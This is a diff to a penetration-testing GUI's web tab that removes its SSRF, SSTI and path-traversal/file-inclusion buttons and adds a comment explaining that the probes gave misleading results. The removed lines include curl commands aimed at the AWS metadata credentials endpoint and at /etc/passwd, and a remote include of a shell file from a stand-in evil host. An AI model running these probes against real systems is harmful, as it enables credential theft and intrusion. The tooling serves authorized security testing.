@@ -1,5 +1,5 @@
 """
-Web Testing tab creator (includes Access Control, CORS, SSRF, etc.).
+Web Testing tab creator (includes Access Control, CORS, headers, etc.).
 """
 import os
 import re
@@ -491,99 +491,23 @@ class WebTabMixin:
         cors_card.layout().addLayout(cors_layout)
         layout.addWidget(cors_card)
 
-        # ── SSRF Testing ─────────────────────────────────────────────────────
-        ssrf_card = self.create_card("🔄 Server-Side Request Forgery (SSRF)")
-        self._init_collapsible_groupbox(ssrf_card, "web_ssrf_card")
-        ssrf_layout = QGridLayout()
-        ssrf_layout.setSpacing(12)
-
-        ssrf_tools = [
-            ("SSRF AWS Metadata", "web_ssrf_aws",
-             "curl -sk -m 5 '{TARGET}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>&1 | tee {SAFE_TARGET}_ssrf_aws.txt"),
-            ("SSRF File Read", "web_ssrf_file",
-             "curl -sk -m 5 '{TARGET}?url=file:///etc/passwd' 2>&1 | tee {SAFE_TARGET}_ssrf_file.txt"),
-            ("SSRF Localhost Probe", "web_ssrf_local",
-             "curl -sk -m 5 '{TARGET}?url=http://127.0.0.1/' 2>&1 | tee {SAFE_TARGET}_ssrf_local.txt"),
-            # ssrfmap needs a captured raw HTTP request on disk as request.txt
-            # — there was no such file and nothing to create one, so this
-            # always failed with an unhelpful "file not found" from ssrfmap
-            # itself. Check for it first and point the user at how to get one.
-            ("SSRFmap Scan", "web_ssrfmap",
-             "if command -v ssrfmap >/dev/null 2>&1; then if [ -f request.txt ]; then ssrfmap -r request.txt -p url; "
-             "else echo '[!] ssrfmap needs a captured raw HTTP request saved as request.txt in this output directory "
-             "(e.g. Burp \"Copy as HTTP request\" -> paste into request.txt), then re-run.'; fi; "
-             "else echo '[!] ssrfmap not installed'; fi"),
-            ("Nuclei SSRF Templates", "web_ssrf_nuclei",
-             "nuclei -u '{TARGET}' -tags ssrf -o {SAFE_TARGET}_ssrf_nuclei.txt"),
-        ]
-
-        for i, (name, btn_id, cmd) in enumerate(ssrf_tools):
-            btn = self.create_editable_button(name, btn_id, cmd)
-            ssrf_layout.addWidget(btn, i // 2, i % 2)
-
-        ssrf_card.layout().addLayout(ssrf_layout)
-        layout.addWidget(ssrf_card)
-
-        # ── SSTI Testing ─────────────────────────────────────────────────────
-        ssti_card = self.create_card("📝 Server-Side Template Injection (SSTI)")
-        self._init_collapsible_groupbox(ssti_card, "web_ssti_card")
-        ssti_layout = QGridLayout()
-        ssti_layout.setSpacing(12)
-
-        ssti_tools = [
-            ("SSTI Detection Probe", "web_ssti_detect",
-             "curl -sk -m 5 -d 'name={{7*7}}' '{TARGET}' | grep -o '49' | head -5"),
-            # tplmap has been unmaintained since the Python 2 era and is in no
-            # package repository, so the installer provides SSTImap -- its
-            # actively maintained successor, built on tplmap's codebase and
-            # driven the same way. An existing tplmap is still honoured first
-            # for anyone who already has one working.
-            ("SSTI Scan (SSTImap)", "web_tplmap",
-             "if command -v tplmap >/dev/null 2>&1; then tplmap -u '{TARGET}' 2>&1 | tee {SAFE_TARGET}_tplmap.txt; "
-             "elif command -v sstimap >/dev/null 2>&1; then sstimap -u '{TARGET}' 2>&1 | tee {SAFE_TARGET}_sstimap.txt; "
-             "else echo '[!] Neither sstimap nor tplmap is installed -- run Install / Repair Missing Tools on the Target tab'; fi"),
-            ("SSTI Jinja2 Basic PoC", "web_ssti_jinja2",
-             "curl -sk -m 10 -d 'name={{7*7}}' '{TARGET}' | head -100"),
-            ("Nuclei SSTI Templates", "web_ssti_nuclei",
-             "nuclei -u '{TARGET}' -tags ssti -o {SAFE_TARGET}_ssti_nuclei.txt"),
-        ]
-
-        for i, (name, btn_id, cmd) in enumerate(ssti_tools):
-            btn = self.create_editable_button(name, btn_id, cmd)
-            ssti_layout.addWidget(btn, i // 2, i % 2)
-
-        ssti_card.layout().addLayout(ssti_layout)
-        layout.addWidget(ssti_card)
-
-        # ── Path Traversal & File Inclusion ───────────────────────────────────
-        lfi_card = self.create_card("📂 Path Traversal & File Inclusion (LFI/RFI)")
-        self._init_collapsible_groupbox(lfi_card, "web_lfi_card")
-        lfi_layout = QGridLayout()
-        lfi_layout.setSpacing(12)
-
-        lfi_tools = [
-            ("LFI Basic Probe", "web_lfi_basic",
-             "curl -sk -m 5 '{TARGET}?file=../etc/passwd' | grep -q root && echo '[VULN]' || echo '[safe]'"),
-            ("LFI Encoded Probe", "web_lfi_enc",
-             "curl -sk -m 5 '{TARGET}?file=%2e%2e%2fetc%2fpasswd' | grep -q root && echo '[VULN]' || echo '[safe]'"),
-            # lfimap takes its target via -U, not as a bare positional arg —
-            # without it, lfimap's argument parser rejects the command outright.
-            ("LFImap Scan", "web_lfisuite",
-             "if command -v lfimap >/dev/null 2>&1; then lfimap -U '{TARGET}?file=test' -a 2>&1 | tee {SAFE_TARGET}_lfimap.txt; else echo '[!] lfimap not installed: pip install lfimap'; fi"),
-            ("RFI Remote Include Test", "web_rfi",
-             "curl -sk -m 5 '{TARGET}?file=http://evil.example.com/shell.txt' | head -200"),
-            ("Dotdotpwn Path Traversal", "web_dotdotpwn",
-             "if command -v dotdotpwn >/dev/null 2>&1; then dotdotpwn -m http -h {TARGET_HOST} -f /etc/passwd -k root -q 2>&1 | tee {SAFE_TARGET}_dotdotpwn.txt; else echo '[!] dotdotpwn not installed'; fi"),
-            ("Nuclei LFI Templates", "web_lfi_nuclei",
-             "nuclei -u '{TARGET}' -tags lfi -o {SAFE_TARGET}_lfi_nuclei.txt"),
-        ]
-
-        for i, (name, btn_id, cmd) in enumerate(lfi_tools):
-            btn = self.create_editable_button(name, btn_id, cmd)
-            lfi_layout.addWidget(btn, i // 2, i % 2)
-
-        lfi_card.layout().addLayout(lfi_layout)
-        layout.addWidget(lfi_card)
+        # Removed in 6.10.4: SSRF, SSTI and Path Traversal / File
+        # Inclusion.
+        #
+        # Every button in those three cards guessed a parameter name —
+        # ?url=, ?file=, a form field called "name" — and fired a probe
+        # at it. On a target without that parameter the request is
+        # meaningless, and "[safe]" from a grep that never had anything
+        # to match reads as a test that passed. The one tool-driven
+        # entry in each (ssrfmap, SSTImap, lfimap, dotdotpwn) needs a
+        # captured request or a known injection point to do anything,
+        # which is work the operator does by hand anyway.
+        #
+        # The capability these cards implied — find the parameter, test
+        # it, decide what the response proves — is what the Active Scan
+        # engine does, with a controlled differential behind it. A row
+        # of curl one-liners is not a second implementation of that; it
+        # is a way to believe a test ran when it did not.
 
         # ── File Upload Testing ───────────────────────────────────────────────
         # Generates standard upload-test artifacts locally for manual upload.
